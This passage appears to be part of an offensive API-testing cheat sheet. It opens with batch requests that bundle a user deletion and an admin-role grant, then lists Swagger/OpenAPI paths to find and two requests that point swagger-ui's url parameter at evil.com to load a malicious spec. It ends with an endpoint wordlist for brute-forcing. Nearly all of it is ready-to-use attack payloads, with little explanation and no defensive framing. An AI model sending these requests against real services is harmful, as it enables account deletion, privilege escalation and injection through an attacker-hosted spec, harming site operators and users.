
--batch
Content-Type: application/http
Content-Transfer-Encoding: binary

GET /api/users/1

--batch
Content-Type: application/http
Content-Transfer-Encoding: binary

DELETE /api/users/2

--batch
Content-Type: application/http
Content-Transfer-Encoding: binary

POST /api/admin HTTP/1.1

{"role": "admin"}
--batch--

# JSON batch
POST /api/batch HTTP/1.1
Content-Type: application/json

{
  "requests": [
    {"method": "GET", "path": "/api/users/1"},
    {"method": "DELETE", "path": "/api/users/2"},
    {"method": "POST", "path": "/api/admin", "body": {"role": "admin"}}
  ]
}
```

## API Documentation Exploitation

### Swagger/OpenAPI Exploitation

```
# Find documentation endpoints
/swagger
/swagger-ui
/swagger-ui.html
/swagger/index.html
/api-docs
/api-docs.json
/v2/api-docs
/v3/api-docs
/openapi
/openapi.json
/openapi.yaml
/rapidoc
/redoc
/rapidoc.html
/redoc.html

# Exploit documentation features
GET /swagger-ui/index.html?url=https://evil.com/malicious.json
GET /api-docs?url=https://evil.com/malicious.yaml

# Try operations from documentation
# Extract all endpoints from swagger.json and test them
```

### API Endpoint Bruteforce

```
# Common API endpoint patterns
endpoints = [
    "/api/users",
    "/api/user",
    "/api/account",
    "/api/profile",
    "/api/admin",
    "/api/settings",
    "/api/config",
    "/api/debug",
    "/api/test",
    "/api/health",
    "/api/status",
    "/api/metrics",
    "/api/logs",
    "/api/backup",
    "/api/export",
    "/api/import",
    "/api/upload",
    "/api/download",
    "/api/webhook",
    "/api/callback",
    "/api/cron",
    "/api/job",
    "/api/task",
    "/api/queue",
    "/api/cache",
    "/api/session",
    "/api/token",
    "/api/auth",
    "/api/login",
    "/api/logout",
    "/api/register",
    "/api/signup",
    "/api/verify",
    "/api/reset",
    "/api/forgot",
    "/api/change",
    "/api/update",
    "/api/delete",
    "/api/create",
    "/api/read",
    "/api/write",
    "/api/execute",
    "/api/run",
    "/api/process",
    "/api/analyze",
    "/api/scan",
    "/api/search",
    "/api/find",
    "/api/list",
    "/api/show",
    "/api/view",
    "/api/get",
    "/api/set",
    "/api/put",
    "/api/post",
    "/api/delete",
    "/api/patch"
]
```

